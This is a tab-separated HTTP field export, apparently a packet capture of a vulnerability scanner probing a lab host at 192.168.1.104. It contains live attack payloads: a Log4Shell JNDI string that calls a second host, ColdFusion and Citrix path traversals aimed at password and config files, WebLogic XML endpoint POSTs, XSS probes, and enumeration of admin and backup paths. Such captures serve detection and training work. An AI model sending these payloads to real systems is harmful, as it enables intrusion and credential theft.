http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																											192.168.1.104									1486						1	http://192.168.1.104/CFIDE/adminapi/customtags/adss.cfm		GET				HTTP/1.1																							/CFIDE/adminapi/customtags/adss.cfm
																											localhost									1187						1	http://localhost/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=test&attributes.file=../../administrator/mail/download.cfm&filename=../lib/password.properties&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=test		GET				HTTP/1.1																							/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=test&attributes.file=../../administrator/mail/download.cfm&filename=../lib/password.properties&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=test
																											192.168.1.104									1552						1	http://192.168.1.104/CFIDE/h.cfm		GET				HTTP/1.1																							/CFIDE/h.cfm
																											192.168.1.104															1	http://192.168.1.104/login.htm		GET				HTTP/1.1																							/login.htm
																											192.168.1.104									1565						1	http://192.168.1.104/CFIDE/h9.cfm		GET				HTTP/1.1																							/CFIDE/h9.cfm
																											192.168.1.104															1	http://192.168.1.104/login.html		GET				HTTP/1.1																							/login.html
																			176	176	text/xml						192.168.1.104									1541						1	http://192.168.1.104/bblog/xmlrpc.php		POST				HTTP/1.1																							/bblog/xmlrpc.php
																											192.168.1.104															1	http://192.168.1.104/login.shtml		GET				HTTP/1.1																							/login.shtml
																											192.168.1.104									1589						1	http://192.168.1.104/CFIDE/help.cfm		GET				HTTP/1.1																							/CFIDE/help.cfm
																			176	176	text/xml						192.168.1.104									1605						1	http://192.168.1.104/blogs/xmlsrv/xmlrpc.php		POST				HTTP/1.1																							/blogs/xmlsrv/xmlrpc.php
																											192.168.1.104															1	http://192.168.1.104/default.htm		GET				HTTP/1.1																							/default.htm
																											192.168.1.104									1613						1	http://192.168.1.104/CFIDE/i.cfm		GET				HTTP/1.1																							/CFIDE/i.cfm
																			176	176	text/xml						192.168.1.104									1618						1	http://192.168.1.104/xmlsrv/xmlrpc.php		POST				HTTP/1.1																							/xmlsrv/xmlrpc.php
																											192.168.1.104															1	http://192.168.1.104/default.html		GET				HTTP/1.1																							/default.html
																											192.168.1.104									1625						1	http://192.168.1.104/CFIDE/r.cfm		GET				HTTP/1.1																							/CFIDE/r.cfm
																			176	176	text/xml						192.168.1.104									1626						1	http://192.168.1.104/xmlrpc/xmlrpc.php		POST				HTTP/1.1																							/xmlrpc/xmlrpc.php
																											192.168.1.104															1	http://192.168.1.104/default.shtml		GET				HTTP/1.1																							/default.shtml
																											192.168.1.104															1	http://192.168.1.104/index.htm		GET				HTTP/1.1																							/index.htm
																			176	176	text/xml						192.168.1.104									1638						1	http://192.168.1.104/script/xmlrpc.php		POST				HTTP/1.1																							/script/xmlrpc.php
																											192.168.1.104															1	http://192.168.1.104/index.html		GET				HTTP/1.1																							/index.html
																											192.168.1.104															1	http://192.168.1.104/index.shtml		GET				HTTP/1.1																							/index.shtml
																											192.168.1.104															1	http://192.168.1.104/rest/v1/AccountService/Accounts		GET				HTTP/1.1																							/rest/v1/AccountService/Accounts
																											192.168.1.104															1	http://192.168.1.104/index.php		HEAD				HTTP/1.1																							/index.php
																											192.168.1.104														${jndi:ldap://192.168.1.101:13456}	1	http://192.168.1.104/		GET				HTTP/1.1																			${jndi:ldap://192.168.1.101:13456}				/
																											192.168.1.104															1	http://192.168.1.104/vpn/../vpns/cfg/smb.conf		GET				HTTP/1.1																							/vpn/../vpns/cfg/smb.conf
																											192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																							/
																											192.168.1.104															1	http://192.168.1.104/portal/diag/index.jsp		GET				HTTP/1.1																							/portal/diag/index.jsp
																			25	25	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/cgi-bin/webcgi/login		POST				HTTP/1.1																							/cgi-bin/webcgi/login
																			247	247	text/xml						192.168.1.104															1	http://192.168.1.104/wls-wsat/CoordinatorPortType		POST				HTTP/1.1																							/wls-wsat/CoordinatorPortType
																			537	537	text/xml						192.168.1.104															1	http://192.168.1.104_async/AsyncResponseService		POST				HTTP/1.1																							_async/AsyncResponseService
																			205	205	text/xml						192.168.1.104															1	http://192.168.1.104/EemAdminService/EemAdmin		POST				HTTP/1.1																							/EemAdminService/EemAdmin
																											192.168.1.104															1	http://192.168.1.104/r7nosuchpage.html		GET				HTTP/1.1																							/r7nosuchpage.html
																											192.168.1.104															1	http://192.168.1.104/robots.txt		GET				HTTP/1.1																							/robots.txt
																											192.168.1.104															1	http://192.168.1.104/login.jsp		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/login.jsp
																											192.168.1.104															1	http://192.168.1.104/exchange/default.asp		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/exchange/default.asp
																											192.168.1.104															1	http://192.168.1.104/exchange/logon.asp		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/exchange/logon.asp
																											192.168.1.104									1789						1	http://192.168.1.104/exchweb/bin/auth/owalogon.asp		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/exchweb/bin/auth/owalogon.asp
																											192.168.1.104									1790						1	http://192.168.1.104/iisstart.asp		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/iisstart.asp
																											192.168.1.104									1787						1	http://192.168.1.104/localstart.asp		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/localstart.asp
																											192.168.1.104									1795						1	http://192.168.1.104/login.asp		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/login.asp
																											192.168.1.104									1799						1	http://192.168.1.104/test.asp		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/test.asp
																											192.168.1.104									1800						1	http://192.168.1.104/Citrix/MetaFrame/auth/auth/login.aspx		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/Citrix/MetaFrame/auth/auth/login.aspx
																											192.168.1.104									1804						1	http://192.168.1.104/test.aspx		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/test.aspx
																											192.168.1.104									1807						1	http://192.168.1.104/cfdocs/search.cfm		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/cfdocs/search.cfm
																											192.168.1.104									1810						1	http://192.168.1.104/cfide/Main/ide.cfm		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/cfide/Main/ide.cfm
																											192.168.1.104									1812						1	http://192.168.1.104/login.cfm		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/login.cfm
																											192.168.1.104									1815						1	http://192.168.1.104/login.cgi		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/login.cgi
																											192.168.1.104									1819						1	http://192.168.1.104/login.php		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/login.php
																											192.168.1.104									1822						1	http://192.168.1.104/login.php3		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/login.php3
																											192.168.1.104									1824						1	http://192.168.1.104/login.shtml		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/login.shtml
																											192.168.1.104									1828						1	http://192.168.1.104/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/
																											192.168.1.104									1831						1	http://192.168.1.104/.cobalt/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/.cobalt/
																											192.168.1.104									1834						1	http://192.168.1.104/AdminScripts/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/AdminScripts/
																											192.168.1.104									1838						1	http://192.168.1.104/%3f.jsp		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/%3f.jsp
																											192.168.1.104									1842						1	http://192.168.1.104/<script>xss</script>.jsp		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/<script>xss</script>.jsp
																											192.168.1.104									1843						1	http://192.168.1.104/<script>xss</script>.asp		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/<script>xss</script>.asp
																											192.168.1.104									1847						1	http://192.168.1.104/<script>xss</script>.aspx		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/<script>xss</script>.aspx
																											192.168.1.104									1851						1	http://192.168.1.104/<script>xss</script>.php		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/<script>xss</script>.php
																											192.168.1.104									1852						1	http://192.168.1.104/<script>xss</script>.shtml		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/<script>xss</script>.shtml
																											192.168.1.104									1856						1	http://192.168.1.104/.svn/entries		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/.svn/entries
																											192.168.1.104									1860						1	http://192.168.1.104/<script>xss</script>.py		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/<script>xss</script>.py
																											192.168.1.104									1861						1	http://192.168.1.104/<script>xss</script>.rb		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/<script>xss</script>.rb
																											192.168.1.104									1865						1	http://192.168.1.104/?P=+ADw-script+AD4-alert(42)+ADw-/script+AD4-		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/?P=+ADw-script+AD4-alert(42)+ADw-/script+AD4-
																											192.168.1.104									1867						1	http://192.168.1.104/ADw-script%20AD4-alert(42)%20ADw-/script%20AD4-		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/ADw-script%20AD4-alert(42)%20ADw-/script%20AD4-
																											192.168.1.104									1870						1	http://192.168.1.104/ADw-script%20AD4-alert(42)%20ADw-/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/ADw-script%20AD4-alert(42)%20ADw-/
																											192.168.1.104									1874						1	http://192.168.1.104/Archive/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/Archive/
																											192.168.1.104									1879						1	http://192.168.1.104/Archives/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/Archives/
																											192.168.1.104									1880						1	http://192.168.1.104/BOAdmin/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/BOAdmin/
																											192.168.1.104									1883						1	http://192.168.1.104/CVS/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/CVS/
																											192.168.1.104									1888						1	http://192.168.1.104/CVS/Entries		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/CVS/Entries
																											192.168.1.104									1889						1	http://192.168.1.104/CVS/Root		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/CVS/Root
																											192.168.1.104									1892						1	http://192.168.1.104/CertControl/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/CertControl/
																											192.168.1.104									1897						1	http://192.168.1.104/CertSrv/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/CertSrv/
																											192.168.1.104									1898						1	http://192.168.1.104/Citrix/MetaFrame/auth/auth/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/Citrix/MetaFrame/auth/auth/
																											192.168.1.104									1901						1	http://192.168.1.104/DEADJOE		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/DEADJOE
																											192.168.1.104									1906						1	http://192.168.1.104/DEADJOE/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/DEADJOE/
																											192.168.1.104									1908						1	http://192.168.1.104/IISSamples/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/IISSamples/
																											192.168.1.104									1910						1	http://192.168.1.104/IISSamples/homepage/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/IISSamples/homepage/
																											192.168.1.104									1915						1	http://192.168.1.104/IISSamples/homepage/themes/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/IISSamples/homepage/themes/
																											192.168.1.104									1917						1	http://192.168.1.104/IISSamples/homepage/themes/gunmetal/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/IISSamples/homepage/themes/gunmetal/
																											192.168.1.104									1920						1	http://192.168.1.104/IISSamples/homepage/themes/journal/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/IISSamples/homepage/themes/journal/
																											192.168.1.104									1922						1	http://192.168.1.104/IISSamples/homepage/themes/looseleaf/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/IISSamples/homepage/themes/looseleaf/
																											192.168.1.104									1927						1	http://192.168.1.104/IISSamples/sdk/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/IISSamples/sdk/
																											192.168.1.104									1928						1	http://192.168.1.104/IISSamples/sdk/admin/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/IISSamples/sdk/admin/
																											192.168.1.104									1933						1	http://192.168.1.104/IISSamples/sdk/asp/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/IISSamples/sdk/asp/
																											192.168.1.104									1935						1	http://192.168.1.104/IISSamples/sdk/asp/applications/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/IISSamples/sdk/asp/applications/
																											192.168.1.104									1938						1	http://192.168.1.104/IISSamples/sdk/asp/componenets/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/IISSamples/sdk/asp/componenets/
																											192.168.1.104									1941						1	http://192.168.1.104/IISSamples/sdk/asp/database/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/IISSamples/sdk/asp/database/
																											192.168.1.104									1943						1	http://192.168.1.104/IISSamples/sdk/asp/docs/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/IISSamples/sdk/asp/docs/
																											192.168.1.104									1947						1	http://192.168.1.104/IISSamples/sdk/asp/interaction/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/IISSamples/sdk/asp/interaction/
																											192.168.1.104									1950						1	http://192.168.1.104/IISSamples/sdk/asp/simple/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/IISSamples/sdk/asp/simple/
																											192.168.1.104									1952						1	http://192.168.1.104/IISSamples/sdk/asp/transactional/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/IISSamples/sdk/asp/transactional/
																											192.168.1.104									1957						1	http://192.168.1.104/InetKit/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/InetKit/
																											192.168.1.104									1959						1	http://192.168.1.104/Logs/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/Logs/
																											192.168.1.104									1960						1	http://192.168.1.104/Phone%20Book%20Service		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/Phone%20Book%20Service
																											192.168.1.104									1967						1	http://192.168.1.104/Phone%20Book%20Service/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/Phone%20Book%20Service/
																											192.168.1.104									1968						1	http://192.168.1.104/ScriptResource.axd?d=test		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/ScriptResource.axd?d=test
																											192.168.1.104									1969						1	http://192.168.1.104/Stats/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/Stats/
																											192.168.1.104									1975						1	http://192.168.1.104/Trace.axd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/Trace.axd
																											192.168.1.104									1977						1	http://192.168.1.104/Usage/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/Usage/
																											192.168.1.104									1979						1	http://192.168.1.104/WS_FTP.LOG		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/WS_FTP.LOG
																											192.168.1.104									1981						1	http://192.168.1.104/Web.sitemap		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/Web.sitemap
																											192.168.1.104									1987						1	http://192.168.1.104/WebResource.axd?d=test		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/WebResource.axd?d=test
																											192.168.1.104									1988						1	http://192.168.1.104/_ScriptLibrary/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/_ScriptLibrary/
																											192.168.1.104									1989						1	http://192.168.1.104/_images/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/_images/
																											192.168.1.104									1994						1	http://192.168.1.104/_pages/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/_pages/
																											192.168.1.104									1997						1	http://192.168.1.104/_private/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/_private/
																											192.168.1.104									2001						1	http://192.168.1.104/adm-bin/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/adm-bin/
																											192.168.1.104									2002						1	http://192.168.1.104/admin/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/admin/
																											192.168.1.104									2003						1	http://192.168.1.104/adojavas.inc		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/adojavas.inc
																											192.168.1.104									2007						1	http://192.168.1.104/adovbs.inc		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/adovbs.inc
																											192.168.1.104									2010						1	http://192.168.1.104/archive/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/archive/
																											192.168.1.104									2012						1	http://192.168.1.104/archives/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/archives/
																											192.168.1.104									2016						1	http://192.168.1.104/art/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/art/
																											192.168.1.104									2018						1	http://192.168.1.104/asp/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/asp/
																											192.168.1.104									2020						1	http://192.168.1.104/aspnet_client/system_web		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/aspnet_client/system_web
																											192.168.1.104									2025						1	http://192.168.1.104/aspnet_client/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/aspnet_client/
																											192.168.1.104									2028						1	http://192.168.1.104/backoffice/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/backoffice/
																											192.168.1.104									2030						1	http://192.168.1.104/backup/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/backup/
																											192.168.1.104									2033						1	http://192.168.1.104/backups		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/backups
																											192.168.1.104									2035						1	http://192.168.1.104/backups/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/backups/
																											192.168.1.104									2038						1	http://192.168.1.104/beta/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/beta/
																											192.168.1.104									2042						1	http://192.168.1.104/bin/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/bin/
																											192.168.1.104									2044						1	http://192.168.1.104/bitrix/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)				/bitrix/
